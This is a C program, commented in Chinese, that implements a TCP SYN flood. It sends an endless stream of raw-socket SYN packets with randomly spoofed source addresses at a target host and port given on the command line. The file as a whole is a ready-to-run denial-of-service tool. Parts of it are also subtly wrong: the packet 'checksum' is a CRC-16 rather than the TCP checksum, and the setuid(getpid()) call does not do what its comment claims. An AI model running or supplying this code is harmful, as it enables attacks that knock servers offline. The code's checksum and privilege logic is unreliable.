/*
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#include <sys/socket.h>
#include <netdb.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip.h>

void attack(int fd, struct sockaddr_in *svaddr, unsigned short srcport);
unsigned short check_sum(const unsigned char *ptr, int length);


int
main(int argc, char *argv[])
{
	struct addrinfo hints;
	struct addrinfo *result, *rp;
	struct sockaddr_in *svaddr;
	struct sockaddr addr;
	unsigned short srcport;
	int fd, ret, optval;


	if (argc != 4) {
		fprintf(stderr, "Usage: %s <dsthost> <dstport> <srcport>\n",
			argv[0]);
		exit(-1);
	}


	memset(&hints, 0, sizeof(struct addrinfo));

	hints.ai_socktype = SOCK_RAW;
	hints.ai_family = AF_UNSPEC;
	hints.ai_protocol = IPPROTO_TCP;	/* TCP的原始套接字 */
	hints.ai_flags = AI_NUMERICSERV;


	ret = getaddrinfo(argv[1], argv[2], &hints, &result);
	if (ret != 0) {
		fprintf(stderr, "getaddrinfo() failed: %s\n", gai_strerror(ret));
		exit(-1);
	}

	optval = 1;
	for (rp = result; rp != NULL; rp = rp->ai_next) {
		fd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);

		if (fd == -1)
			continue;

		/* open IP_HDRINCL */
		if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &optval, sizeof(optval)) == -1) {
			perror("setsockopt() failed: ");
			exit(-1);
		}

		break;
	}

	addr = *(rp->ai_addr);
	freeaddrinfo(result);

	svaddr = (struct sockaddr_in *) &addr;


	/* 让执行该命令的用户以该命令拥有者的权限去执行 */
	/* 因为只有root用户才可以play with raw socket :) */
	setuid(getpid());
	srcport = atoi(argv[3]);
	attack(fd, svaddr, srcport);

	return 0;
}

/*
 * 在该函数中构造整个IP报文，最后调用sendto函数将报文发送出去
 */
void
attack(int fd, struct sockaddr_in *svaddr, unsigned short srcport)
{
	char buf[128];
	struct ip *ip_head;
	struct tcphdr *tcp_head;
	int ip_len;

	memset(buf, 0, sizeof(buf));

	/* TCP的报文中Data没有字段，所以整个IP报文的长度=ip头+tcp头 */
	ip_len = sizeof(struct ip) + sizeof(struct tcphdr);

	/* 开始填充IP首部 */
	ip_head = (struct ip *) buf;

	ip_head->ip_v = IPVERSION;
	ip_head->ip_hl = sizeof(struct ip) >> 2;
	ip_head->ip_tos = 0;
	ip_head->ip_len = htons(ip_len);
	ip_head->ip_id = 0;
	ip_head->ip_off = 0;
	ip_head->ip_ttl = MAXTTL;
	ip_head->ip_p = IPPROTO_TCP;
	ip_head->ip_sum = 0;
	ip_head->ip_dst = svaddr->sin_addr;

	/* 开始填充TCP首部 */
	tcp_head = (struct tcphdr *) (buf + sizeof(struct ip));

	tcp_head->source = htons(srcport);
	tcp_head->dest = svaddr->sin_port;
	tcp_head->seq = random();
	tcp_head->doff = 5;
	tcp_head->syn = 1;
	tcp_head->check = 0;

	while (1) {
		/* 源地址伪造，我们随便任意生成个地址，让服务器一直等待下去 */
		ip_head->ip_src.s_addr = random();
		tcp_head->check = check_sum((unsigned char *) tcp_head, sizeof(struct tcphdr));
		sendto(fd, buf, ip_len, 0, (struct sockaddr *) svaddr, sizeof(struct sockaddr_in));
	}
}

/*
 * CRC校验和的计算
 */
unsigned short
check_sum(const unsigned char *ptr, int length)
{
	unsigned short crc = 0xFFFF;
	int i;

	while (length--) {
		crc ^= *ptr++;
		for (i = 0; i < 8; ++i) {
			if (crc & 0x01) {
				crc >>= 1;
				crc ^= 0xA001;
			} else
				crc >>= 1;
		}
	}

	return crc;
}
